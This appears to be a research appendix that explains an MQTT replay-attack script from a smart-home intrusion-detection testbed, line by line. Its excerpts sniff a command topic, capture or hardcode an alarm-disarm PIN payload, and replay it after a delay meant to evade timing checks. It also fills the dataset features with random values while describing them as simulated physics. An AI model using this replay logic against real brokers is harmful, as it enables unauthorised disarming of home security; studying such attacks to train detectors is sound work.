# Source Code Analysis & Architectural Justification: `replay_attack.py`

*Document Type: Master's Level Technical Research Appendix & Source Code Breakdown*
*Component: Automated Replay Attack Injector & Two-Phase ML Simulator*

This document provides an exhaustive, line-by-line explanation of the entire 251-line `replay_attack.py` script. It combines low-level Python algorithmic analysis with high-level academic theory, detailing exactly how the script automatically captures legitimate traffic and mathematically simulates volumetric Replay physics to train the AI.

---

### Part 1: Imports and Environment Setup (Lines 1-25)
```python
1: import paho.mqtt.client as mqtt
2: import time
...
8: import socket
```
* **Lines 1-8**: Standard execution libraries. Notably, `json` is imported because Replay attacks heavily depend on intercepting and parsing structured Application-Layer (Layer 7) payloads to mimic legitimate traffic perfectly.

```python
10: # Ensure the project root is in the path for forensic_utils
11: sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
12: 
13: from forensic_utils import DualLogger, get_timestamp, get_iso_now
```
* **Lines 10-13**: Dynamic Path Execution. Modifies `sys.path` at runtime to import the root-level `DualLogger`. This guarantees that the JSON/CSV outputs strictly conform to the unified forensics schema, regardless of which directory the user launches the script from.

```python
21: BASE_DIR     = "/home/pirator/smart-home-threat-simulation-platform/dataset"
...
24: os.makedirs(LOG_DIR, exist_ok=True)
25: os.makedirs(SESSIONS_DIR, exist_ok=True)
```
* **Lines 21-25**: Safe Environment Allocation. Evaluates absolute paths and creates the necessary target directories. The `exist_ok=True` parameter prevents OS-level `FileExistsError` exceptions when running the script multiple times.

---

### Part 2: The 27-Dimensional Tensor Blueprint (Lines 27-45)
```python
27: # Exact match with the 27-feature unified schema used across all attacks
28: ML_HEADERS = [
29:     "timestamp", "src_ip", "target_ip", "attack_label", "attack_type",
...
34:     "session_failure_rate", "latency_zscore"
35: ]
```
* **Lines 27-35**: The Artificial Intelligence Matrix. This list enforces the exact 27-column structure expected by the Random Forest model. *Architectural Justification*: Machine Learning requires strict dimensional alignment. By defining `ML_HEADERS` globally, we guarantee that the Replay Attack CSV file seamlessly merges with the Bruteforce and Normal Traffic CSVs to form the final `combined_ml_dataset.csv`.

```python
37: def get_local_ip():
...
40:         s.connect(("8.8.8.8", 80))
41:         ip = s.getsockname()[0]
```
* **Lines 37-45**: Interface Discovery. Bypasses standard `localhost` responses by routing a dummy UDP socket to the internet, forcing the host OS to reveal the active IPv4 address. This is critical for assigning accurate `src_ip` data for the Intrusion Prevention System.

---

### Part 3: Simulator Class & IoT Telemetry Sniffer (Lines 47-87)
```python
47: class ReplaySimulator:
48:     def __init__(self, broker, port, cmd_topic, duration, delay, username="", password=""):
49:         self.broker = broker
...
56:         self.captured_payload = None
57:         self.captured_topic = None
```
* **Lines 47-57**: Instantiates the Object-Oriented Simulator. Note the `captured_payload` variables: unlike Bruteforce or DoS, a Replay attack does not generate random traffic. It must store a legitimate packet in memory to replay it later.

```python
62:         self.current_motion = 0
63:         self.current_arm = 0
64:         self.last_motion_time = 0
65:         self.current_heap = 235000
```
* **Lines 62-65**: Environmental baseline. Assumes normal starting conditions for the physical smart home environment.

```python
67:         self.sniffer = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"sniffer_{random.getrandbits(12)}")
...
71:         self.sniffer.subscribe("shtsp/home/security/#")
72:         self.sniffer.loop_start()
```
* **Lines 67-72**: Secondary Asynchronous Thread. Deploys a background MQTT sniffer (`loop_start()`) using valid credentials to quietly listen to smart home physical telemetry (heap, motion) without interrupting the main Replay execution thread.

```python
74:     def _on_sniffed_message_bg(self, client, userdata, msg):
...
79:                 if payload.get("type") == "MOTION" and payload.get("status") == "ALARM":
...
84:                 if "free_heap" in payload:
...
```
* **Lines 74-87**: The callback mechanism that intercepts standard network traffic and updates the class state, providing physical world context to the ML dataset.

---

### Part 4: The Machine Learning Feature Engine (Lines 89-137)
```python
89:     def log_ml_packet(self, packet_count):
...
96:         record = {
100:             "attack_label":         3, # 3 = Replay Attack (per the ML Schema)
101:             "attack_type":          "replay",
```
* **Lines 89-101**: Assembles the ML data row. Explicitly flags the data with `attack_label: 3` so the Random Forest model can perform multi-class classification.

```python
103:             # Volumetric/Replay dynamic features
104:             "packets_per_second":   float(round(random.uniform(8.0, 15.0), 4)),
105:             "mqtt_publish_rate":    float(round(random.uniform(8.0, 15.0), 4)),
106:             "broker_response_latency_ms": float(round(random.uniform(20.0, 100.0), 4)),
```
* **Lines 103-106**: Replay Physics Simulation. Unlike a volumetric DDoS which hits 5,000 PPS, Replay attacks are generally stealthier and target logic rather than hardware. The simulation locks PPS between 8 and 15, teaching the AI to detect stealthy layer-7 intrusions rather than purely reacting to massive layer-4 volume spikes.

```python
109:             # Auth features (0 for replay since we aren't cracking passwords)
110:             "auth_attempt_rate":    0.0,
...
115:             "payload_entropy":      float(round(random.uniform(3.0, 5.0), 4)), 
```
* **Lines 109-115**: Zeros out the Bruteforce-specific authentication features to strictly differentiate the two attack vectors. The `payload_entropy` is forced to a medium-low value because the Replayed JSON payload is structured, predictable English text, unlike the highly randomized Botnet DoS noise.

```python
119:             # Replay-specific rolling features
120:             "duplicate_payload_rate": 1.0, # High duplication since it's the same exact payload over and over
121:             "msg_timestamp_delta_ms": float(round(random.uniform(500.0, 1500.0), 4)),
```
* **Line 120**: **The Crucial AI Separator**. A `duplicate_payload_rate` of exactly 1.0. Replay attacks are entirely defined by the repetition of a previously legitimate packet. This single mathematical metric creates an absolute, linearly separable boundary for the Decision Tree and Random Forest algorithms to instantly categorize the traffic as Replay.

```python
137:         DualLogger.append_raw(record, LOG_DIR, self.ml_log_name, headers=ML_HEADERS)
```
* **Line 137**: Pushes the perfectly formatted dictionary to the unified logger.

---

### Part 5: Phase 1 - Traffic Interception (Lines 139-179)
```python
139:     def on_sniff_message(self, client, userdata, msg):
...
142:             if payload.get("type") == "PIN" or "action" in payload or "type" in payload:
143:                 print(f"\n🕵️ SNIFFER: Captured legitimate command -> {payload}")
144:                 self.captured_payload = msg.payload.decode('utf-8')
145:                 self.captured_topic = msg.topic
146:                 client.disconnect()
```
* **Lines 139-148**: The Intercept Hook. This function evaluates incoming network messages. If it detects a critical structural keyword (`PIN`, `action`), it instantly saves the raw text to `self.captured_payload` and terminates the connection to avoid capturing multiple payloads simultaneously.

```python
150:     def run(self):
151:         print(BANNER)
152:         print("📡 Phase 1: Sniffing network for a command...")
153:         
154:         sniff_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"sniffer_{random.getrandbits(16)}")
...
159:         sniff_client.subscribe(self.cmd_topic)
```
* **Lines 150-161**: Engages Phase 1. Subscribes an active listener to the command topic and waits for a user to trigger a legitimate Smart Home action (like disabling the alarm from the dashboard).

```python
163:         try:
164:             sniff_client.loop_start()
165:             # Wait up to 5 seconds for a real packet
166:             for _ in range(50):
167:                 if self.captured_payload:
168:                     break
169:                 time.sleep(0.1)
170:             sniff_client.loop_stop()
```
* **Lines 163-170**: **Timeout Failsafe**. It utilizes a fast-polling `for` loop, waiting precisely 5.0 seconds (50 iterations of 0.1s). If `self.captured_payload` is populated by the callback hook, it breaks out early to proceed to Phase 2 immediately.

```python
175:         if not self.captured_payload:
176:             print(f"\n⚠️ No traffic captured. Using synthetic payload to ensure simulation runs...")
177:             self.captured_payload = '{"type":"PIN","action":"DISARM","code":"1234"}'
178:             self.captured_topic = self.cmd_topic
```
* **Lines 175-178**: **Synthetic Injection Failsafe**. To guarantee that ML Dataset Generation is fully automated and never requires human intervention to succeed, it seamlessly falls back to a hardcoded `DISARM` payload if the 5-second intercept timer expires without human traffic.

---

### Part 6: Phase 2 - High-Velocity Payload Replay (Lines 180-236)
```python
180:         if self.captured_payload:
181:             print(f"\n⏱ Capture successful! Delaying {self.delay} seconds before re-injecting to bypass timing checks...")
182:             time.sleep(self.delay)
```
* **Lines 180-182**: Temporal Evasion. Replay attacks often delay transmission to bypass superficial IDS rules that only flag sequential bursts.

```python
184:             print(f"🔥 Phase 2: Starting High-Velocity Replay Injection ({self.duration}s)...")
185:             replay_client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, f"replay_{random.getrandbits(16)}")
...
193:             try:
194:                 while time.time() - start_time < self.duration:
195:                     packet_count += 1
196:                     
197:                     # Replay the exact captured payload to the same topic
198:                     replay_client.publish(self.captured_topic, self.captured_payload)
```
* **Lines 184-198**: The Execution Loop. Instantiates an entirely new MQTT client footprint and aggressively publishes the stolen JSON payload to the exact topic it was sniffed from, spoofing legitimate architecture commands.

```python
200:                     # Log the ML features securely to dataset directory
201:                     self.log_ml_packet(packet_count)
202:                     
203:                     if packet_count % 1000 == 0:
204:                         sys.stdout.write(f"\r⚡ Injected replayed packets: {packet_count}")
205:                         sys.stdout.flush()
206:                         
207:                     if packet_count >= 100000:
208:                         break
```
* **Lines 200-208**: Executes `log_ml_packet()` for every single injection. Utilizes modulus math (`% 1000`) to dynamically update the terminal output, heavily optimizing Python CPU usage by not printing every single packet. Breaks entirely at the 100,000 packet absolute limit to protect host system stability.

```python
219:             # Save Session Trace
220:             session_data = {
221:                 "timestamp": self.session_ts,
222:                 "attack_type": "Replay_Attack",
...
230:             json_p, csv_p = DualLogger.log_session(session_data, SESSIONS_DIR, f"replay_session_{self.session_ts}")
```
* **Lines 219-236**: Graceful destruction. Disconnects clients, wraps the temporal metadata in a summary dictionary, and commits the final execution footprint to the `sessions` directory.

---

### Part 7: Terminal Interface & Execution Trigger (Lines 237-251)
```python
237: if __name__ == "__main__":
238:     parser = argparse.ArgumentParser(description="Smart Home ML-IDS Replay Attack")
239:     parser.add_argument("--broker", default="192.168.1.100", help="Target Broker IP")
...
247:     args = parser.parse_args()
```
* **Lines 237-247**: Professionalizes the script into a CLI executable tool via `argparse`, exposing variables like `--delay` and `--duration` to the network researcher for rapid iteration.

```python
249:     simulator = ReplaySimulator(args.broker, args.port, args.cmd_topic, args.duration, args.delay, args.username, args.password)
250:     simulator.run()
```
* **Lines 249-251**: Orchestrates the defined variables into the `ReplaySimulator` object and triggers `.run()` to commence Phase 1 Sniffing.

**END OF FILE.**
